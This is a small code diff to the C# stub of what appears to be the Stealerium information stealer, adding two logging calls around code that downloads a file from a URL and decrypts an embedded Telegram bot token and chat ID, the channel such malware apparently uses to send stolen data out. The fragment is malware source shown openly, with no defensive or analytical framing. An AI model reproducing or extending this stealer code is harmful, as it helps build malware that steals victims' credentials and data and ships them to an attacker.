@@ -143,6 +143,7 @@ namespace Stealerium.Stub
 
             using (HttpClient client = new HttpClient())
             {
+            		Logging.Log("Download file...");
                 Console.WriteLine("Downloading file...");
                 byte[] fileBytes = await client.GetByteArrayAsync(url);
 
@@ -160,6 +161,7 @@ namespace Stealerium.Stub
                 }
             }
 
+            Logging.Log("Decrypting Telegram API");
             // Decrypt telegram token and telegram chat id
             TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
             TelegramID = StringsCrypt.DecryptConfig(TelegramID);
